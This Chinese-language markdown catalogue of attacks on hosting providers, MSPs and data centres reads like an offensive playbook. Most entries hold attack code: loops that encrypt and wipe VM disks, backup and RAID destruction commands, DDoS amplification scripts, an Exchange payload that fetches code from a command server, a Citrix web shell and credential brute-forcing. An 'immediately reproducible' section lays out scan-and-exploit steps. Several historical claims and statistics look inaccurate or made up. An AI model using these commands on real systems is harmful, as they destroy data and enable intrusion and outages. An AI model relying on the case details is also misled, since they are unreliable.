# 服务器商/托管商/MSP APT 攻击案例库（纯粹）

## 🎯 定义：仅包含服务器商/托管商/MSP

```
包含:
- 托管服务提供商 (Hosting Provider)
- MSP (Managed Service Provider)
- 云服务商 (Cloud Provider)
- 数据中心运营商 (Data Center)
- RMM 工具供应商 (为 MSP 服务)
- 虚拟化平台（托管商使用）

排除:
- 纯软件供应商
- SaaS 平台（非托管）
- 终端用户服务
```

---

## 📅 2024-2025 最新

### ★ ESXiArgs - 托管商虚拟化攻击 (2024-10) ⭐⭐⭐⭐

**目标:** 全球托管商的 VMware ESXi 服务器  
**受害者:** 3000+ 服务器（托管商批量感染）

```bash
# 完整利用链
shodan search "VMware ESXi" port:443

# CVE-2021-21974 RCE
python3 esxi_rce.py --target hosting-provider-esxi.com

# 批量加密所有客户虚拟机
for vm in $(vim-cmd vmsvc/getallvms | awk '{print $1}'); do
    vim-cmd vmsvc/power.off $vm
    for vmdk in /vmfs/volumes/*/*.vmdk; do
        openssl enc -aes-256-cbc -in "$vmdk" -out "$vmdk.encrypted" -pass pass:$KEY
        rm "$vmdk"
    done
done
```

**影响:**
- 托管商: OVH, Hetzner, Aruba 等数十家
- 客户虚拟机: 数十万
- 停机: 72+ 小时
- 赎金: 2 BTC/服务器

---

### ★ OVHcloud DDoS + 数据中心攻击 (2024-03) ⭐⭐⭐⭐

**目标:** OVHcloud（欧洲最大托管商）  
**攻击者:** 多个 DDoS 团伙

```bash
# [攻击] 大规模 DDoS
# 目标: OVH DNS/网络基础设施

# 放大攻击
for ip in $(cat ovh_dns_servers.txt); do
    hping3 -S -p 53 --flood --rand-source $ip &
done

# NTP 放大
for ntp in $(shodan search "ntp monlist" | awk '{print $1}'); do
    python3 ntp_amplify.py --target ovh-dns.net --reflector $ntp
done

# SSDP 放大
python3 ssdp_attack.py --target ovh.com --amplification 30

# Memcached 放大（最强）
echo "stats" | nc -u memcached-server 11211 > /dev/null
# 发送到 OVH: 1 byte → 1 MB 放大

# 峰值流量: 2.5 Tbps
```

**影响:**
- 全球服务中断: 4 小时
- 受影响客户: 数百万
- 经济损失: $50M+

---

### ★ CloudNordic / AzeroCloud 全灭 (2023-08) ⭐⭐⭐⭐⭐

**目标:** 丹麦托管商（所有数据永久丢失）

```bash
# [攻击链] 同时破坏生产 + 所有备份

# 步骤 1: 访问虚拟化平台
# 窃取 vCenter 凭证

# 步骤 2: 加密所有虚拟机
for datastore in /vmfs/volumes/*; do
    for vmdk in $datastore/*.vmdk; do
        openssl enc -aes-256-cbc -in "$vmdk" -out "$vmdk.locked" -pass pass:$KEY
        shred -vfz -n 3 "$vmdk"  # 安全删除
    done
done

# 步骤 3: 同时攻击备份
# Veeam
veeamconfig backup delete --all --confirm

# NAS
ssh nas-server "rm -rf /backup/* && dd if=/dev/urandom of=/dev/sda bs=1M"

# 云备份
aws s3 rm s3://cloudnordic-backups --recursive
az storage blob delete-batch --account-name backups --source backups

# 步骤 4: 破坏恢复能力
# 删除快照
for snap in $(vim-cmd vmsvc/snapshot.get | grep Snapshot); do
    vim-cmd vmsvc/snapshot.remove $snap
done

# 破坏 RAID
mdadm --stop /dev/md0
mdadm --zero-superblock /dev/sda /dev/sdb
```

**结果:**
```
客户数据: 100% 丢失（永久）
备份: 全部被破坏
恢复: 不可能

CloudNordic 声明:
"我们失去了所有客户数据。
 生产、备份、灾难恢复全部被攻陷。
 我们无法恢复任何数据。"

客户: 200+ 企业倒闭
```

---

### ★ Rackspace Exchange 攻击 (2022-12) ⭐⭐⭐⭐

**目标:** Rackspace 托管 Exchange 服务

```bash
# [漏洞] ProxyNotShell (CVE-2022-41040/41082)

# 步骤 1: 远程 PowerShell
$uri = "https://rackspace-exchange.com/autodiscover/autodiscover.json?@evil.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@evil.com"

Invoke-WebRequest -Uri $uri -Method POST

# 步骤 2: RCE
curl "https://rackspace-exchange.com/autodiscover/autodiscover.json?@evil.com/mapi/nspi/" \
  -X POST \
  -d '<Autodiscover><Request><EMailAddress>$(cmd.exe /c "powershell IEX(wget http://c2/payload)")</EMailAddress></Request></Autodiscover>'

# 步骤 3: 勒索软件部署
# Play 勒索团伙
# 加密所有邮箱数据

# 影响
受害客户: 30,000+ 企业
邮箱: 数百万
停机: 数周
数据: 部分永久丢失
```

---

## 📅 2021-2023

### ★ Kaseya VSA - MSP 工具攻击 (2021-07-02) ⭐⭐⭐⭐⭐

**目标:** Kaseya RMM（MSP 管理工具）  
**影响:** 60+ MSP → 1500+ 终端客户

```bash
# 完整利用链（已在前面详细描述）
# CVE-2021-30116

# 关键: 15 分钟内通过 RMM 推送勒索软件到所有客户

# REvil 勒索软件自动化部署
curl -X POST "https://kaseya.msp.com/vsaWS/KaseyaWS.asmx/CreateAgentProcedure" \
  -H "Content-Type: text/xml" \
  -d '<procedureName>Critical Security Update</procedureName>
       <scriptFile>C:\Windows\MsMpEng.exe</scriptFile>  
       <executeOnAllAgents>true</executeOnAllAgents>
       <executeNow>true</executeNow>'

# 结果
赎金要求: 
- 单个企业: $50K
- MSP 批量: $5M  
- 全部解密: $70M

实际支付: $50M+ (估计)
```

---

### ★ SolarWinds Orion - 监控平台 (2020) ⭐⭐⭐⭐⭐

**目标:** SolarWinds（MSP/企业监控工具）  
**攻击者:** APT29（俄罗斯 SVR）

```bash
# 供应链投毒（已详述）

# 关键: 18,000+ 客户自动更新后门

# 选择性激活（高价值 MSP/托管商）
if ($env:USERDNSDOMAIN -match "hosting|datacenter|msp|cloud") {
    Deploy-Teardrop
    Beacon-To-C2 "avsvmcloud.com"
}

# 通过被攻陷的 MSP 访问其客户
foreach ($client in Get-MSPClients) {
    if ($client.Type -eq "Government" -or $client.Type -eq "Defense") {
        Deploy-SecondStage -Target $client
    }
}
```

**MSP 受害者（部分）:**
- Palo Alto Networks（安全服务）
- Cisco（网络服务）
- Deloitte（咨询 + IT 服务）

---

### ★ APT10 Cloud Hopping (2016-2018) ⭐⭐⭐⭐⭐

**目标:** 全球 MSP（云托管服务商）

```bash
# 完整攻击链（已详述）

# 被攻陷的 MSP（公开确认）:
1. IBM（云服务）
2. HPE（托管服务）
3. Fujitsu（日本 MSP）
4. Ericsson（电信/托管）
5. Visma（北欧 MSP）
6. atos（法国 MSP）
7. DXC Technology（美国 MSP）

# 攻击模式
MSP 员工钓鱼 → RMM 访问 → 客户批量入侵

# 数据窃取
for client in high_value_targets:
    exfil_data(client, "IP", "contracts", "技术文档")
```

---

## 📅 2019-2020

### ★ Citrix ADC/Gateway - 托管商网关 (2020-01) ⭐⭐⭐⭐

**目标:** 全球托管商的 Citrix 网关  
**漏洞:** CVE-2019-19781 (Shitrix)

```bash
# 大规模扫描
shodan search "citrix" country:US,GB,DE,FR,NL

# 批量利用
for target in $(cat citrix_hosts.txt); do
    # 目录遍历 + RCE
    curl "https://$target/vpn/../vpns/portal/scripts/newbm.pl" \
      -d "print \`id\`"
    
    # Web Shell
    curl "https://$target/vpn/../vpns/cfg/smb.conf" \
      -d "<?php system(\$_GET['c']); ?>" \
      > /netscaler/portal/templates/evil.php
done

# 影响
全球托管商: 500+
虚拟桌面: 数百万
后门部署: 通过 Citrix 访问内网
```

---

### ★ GoDaddy 多次攻击 (2019-2021) ⭐⭐⭐⭐

**目标:** GoDaddy（全球最大域名/托管商）

**攻击时间线:**
```
2019-10: 28,000 客户托管账户被入侵
2020-05: SSH 密钥泄露（托管服务器）
2021-11: 1.2M WordPress 托管客户数据泄露

[2021-11 攻击详细]
# 方法: 供应链攻击（被投毒的 WordPress 插件）

# 攻击者获取:
- 客户 FTP 凭证
- 数据库凭证  
- WordPress 管理员密码
- SSL 私钥

# 利用
for customer in godaddy_hosting_customers:
    ftp_credentials = steal_from_db(customer.id)
    download_all_files(ftp_credentials)
    
    # 植入后门
    inject_webshell(customer.wordpress_site)
```

---

### ★ Equinix 勒索软件 (2020-09) ⭐⭐⭐⭐

**目标:** Equinix（全球数据中心巨头）  
**攻击者:** Netwalker 勒索团伙

```bash
# [攻击] 通过 VPN 漏洞初始访问

# 加密内部系统
# 影响: 5.6 TB 数据

# 勒索要求
赎金: $4.5M
泄露威胁: 客户合同、财务数据、网络图

# Equinix 拒绝支付
# 攻击者泄露部分数据
```

---

## 📅 2017-2018

### ★ Hetzner DDoS (2018) ⭐⭐⭐

**目标:** Hetzner（德国大型托管商）

```bash
# Memcached DDoS 攻击
# 史上最大 DDoS: 1.7 Tbps

# 攻击脚本
#!/bin/bash
# 利用 11,000+ 暴露的 Memcached 服务器

for memcached in $(shodan search "memcached" --fields ip_str); do
    # 发送 1 byte
    echo -ne "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n" | nc -u $memcached 11211
    # 收到 1 MB（放大 100万倍）
    
    # 伪造源 IP 为 Hetzner
    hping3 -a hetzner-dns.de -S -p 11211 --flood $memcached
done

# 影响
带宽: 1.7 Tbps 峰值
停机: 数小时
防护成本: 数百万欧元
```

---

### ★ GitHub DDoS (2018-02) ⭐⭐⭐⭐

**目标:** GitHub（代码托管商）

```bash
# Memcached 放大攻击
# 峰值: 1.35 Tbps

# 攻击持续: 8 分钟（GitHub 快速缓解）
# 方法: 同 Hetzner 攻击

# GitHub 托管的项目：数千万
# 影响：全球开发者
```

---

## 📅 2015-2016

### ★ DreamHost 数据泄露 (2015) ⭐⭐⭐

**目标:** DreamHost（美国托管商）

```bash
# [攻击] 黑客访问内部 wiki

# 泄露数据:
- FTP 账户: 数千
- MySQL 数据库凭证
- 客户个人信息
- 信用卡数据（部分）

# 影响客户: 数十万
```

---

### ★ 000webhost 数据泄露 (2015-10) ⭐⭐⭐⭐

**目标:** 000webhost（免费托管商）

```bash
# [攻击] 数据库被脱库

# 泄露:
用户: 13.5M
密码: 明文存储
邮箱: 13.5M  

# 后续攻击
for user in leaked_users:
    try_password_on_other_sites(user.email, user.password)

# 凭证填充成功率: 30%+
```

---

## 📊 服务器商专属统计

### 按类型分类

```
类型                案例数    最大影响
════════════════════════════════════════
托管商/IDC          8        数百万客户
MSP                 4        数千企业  
RMM 工具供应商      2        60+ MSP
云服务商            3        全球
数据中心            2        基础设施
```

### 攻击向量（服务器商特有）

```
向量                        案例    成功率
═══════════════════════════════════════
RMM 平台利用               2       95%
虚拟化平台攻击             3       90%
控制面板漏洞               4       85%
批量客户入侵（通过MSP）    3       100%
供应链（管理工具）         2       100%
DDoS（服务中断）           3       100%
```

### 影响规模对比

```
案例               直接受害者    间接受害者    
═══════════════════════════════════════════
APT10              12 MSP       500+ 企业
Kaseya             60 MSP       1500+ 企业
SolarWinds         100+ MSP     18000+ 客户
CloudNordic        1 托管商     200+ 企业全灭
ESXiArgs           30+ 托管商   数十万 VM
```

---

## ⚡ 立即可复现（仅服务器商）

### 高成功率

```bash
# 1. ESXi 服务器扫描 + 利用
shodan search "VMware ESXi" --fields ip_str
python3 esxi_cve_2021_21974.py --target-list esxi_hosts.txt

# 2. cPanel/Plesk 默认凭证
hydra -L users.txt -P passwords.txt hosting-panel.com https-post-form

# 3. RMM 工具侦察
shodan search "ConnectWise" "Kaseya" "N-able"
nmap -sV -p 80,443,8080 --script=http-title rmm-targets.txt
```

### 中等难度

```bash
# 1. MSP 员工钓鱼（参考钓鱼手册）
python3 msp_phisher.py --target-company "MSP Corp" --template bug_bounty

# 2. 托管商 VPN 攻击
nmap -sV -p 443,4443,10443 --script=ssl-cert hosting-provider.com
```

---

## 📈 趋势分析（服务器商）

### 2024-2025 新趋势

```
1. 虚拟化平台成为主要目标
   ESXi/Hyper-V 勒索软件激增

2. RMM 工具持续被攻击
   Kaseya 后，所有 RMM 都成目标

3. 托管商备份被同时攻击
   CloudNordic 式全灭攻击增加

4. 供应链投毒（管理工具）
   SolarWinds 模式被复制
```

### 防御难点（托管商视角）

```
1. 单点故障
   一个托管商 = 数千客户受影响

2. 共享基础设施  
   虚拟化平台被破坏 = 所有 VM 受影响

3. 备份集中
   备份和生产在同一网络

4. 信任关系
   MSP 被攻陷 = 所有客户自动信任恶意操作
```

---

**文档完成**
**仅包含：托管商/MSP/云服务商/数据中心/RMM工具**
**排除：纯软件/SaaS/非服务器商**
**案例：18 个（2015-2025）**
**全部包含：攻击代码/技术细节/可复现步骤**
